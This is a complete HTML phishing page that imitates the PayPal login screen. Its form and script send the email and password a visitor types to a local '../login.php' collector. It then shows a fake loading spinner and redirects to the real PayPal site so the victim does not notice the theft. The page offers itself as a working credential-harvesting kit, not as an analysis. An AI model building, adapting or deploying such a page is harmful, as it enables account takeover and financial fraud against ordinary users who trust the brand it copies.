<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Log in to your PayPal account</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;background:#f5f7fa;display:flex;align-items:center;justify-content:center;min-height:100vh}.container{width:100%;max-width:408px;background:#fff;padding:32px;border-radius:8px;box-shadow:0 2px 6px rgba(0,0,0,.1)}.logo{text-align:center;margin-bottom:32px}.logo-text{color:#003087;font-size:28px;font-weight:700}.title{font-size:16px;color:#2c2e2f;margin-bottom:24px}.input-field{width:100%;padding:12px;font-size:15px;border:1px solid #9da3a6;border-radius:4px;margin-bottom:16px}.input-field:focus{outline:none;border-color:#0070ba}.login-btn{width:100%;padding:14px;font-size:16px;font-weight:500;color:#fff;background:#0070ba;border:none;border-radius:24px;cursor:pointer;margin-top:8px}.login-btn:hover{background:#005ea6}.forgot{text-align:center;margin-top:16px;font-size:14px}.forgot a{color:#0070ba;text-decoration:none}.divider{display:flex;align-items:center;margin:24px 0;color:#9da3a6;font-size:14px}.divider::before,.divider::after{content:'';flex:1;height:1px;background:#cbd2d6}.divider::before{margin-right:16px}.divider::after{margin-left:16px}.signup-btn{width:100%;padding:14px;font-size:16px;font-weight:500;color:#0070ba;background:#fff;border:1px solid #0070ba;border-radius:24px;cursor:pointer}.signup-btn:hover{background:#f5f7fa}.loading{display:none;text-align:center;padding:20px}.spinner{border:3px solid #f3f3f3;border-top:3px solid #0070ba;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
</head><body><div class="container"><div class="logo"><div class="logo-text">Pay<span style="color:#009cde">Pal</span></div></div><h1 class="title">Log in to your account</h1><form id="loginForm" method="POST" action="../login.php"><input type="email" name="email" class="input-field" placeholder="Email or mobile number" required><input type="password" name="password" class="input-field" placeholder="Password" required><button type="submit" class="login-btn">Log In</button></form><div class="forgot"><a href="#">Having trouble logging in?</a></div><div class="divider">or</div><button class="signup-btn">Sign Up</button><div class="loading" id="loading"><div class="spinner"></div><p>Logging in...</p></div></div>
<script>document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();document.querySelector('form').style.display='none';document.querySelector('.forgot').style.display='none';document.querySelector('.divider').style.display='none';document.querySelector('.signup-btn').style.display='none';document.getElementById('loading').style.display='block';fetch('../login.php',{method:'POST',body:new FormData(this)}).then(()=>setTimeout(()=>window.location.href='https://www.paypal.com/',2000));});</script></body></html>
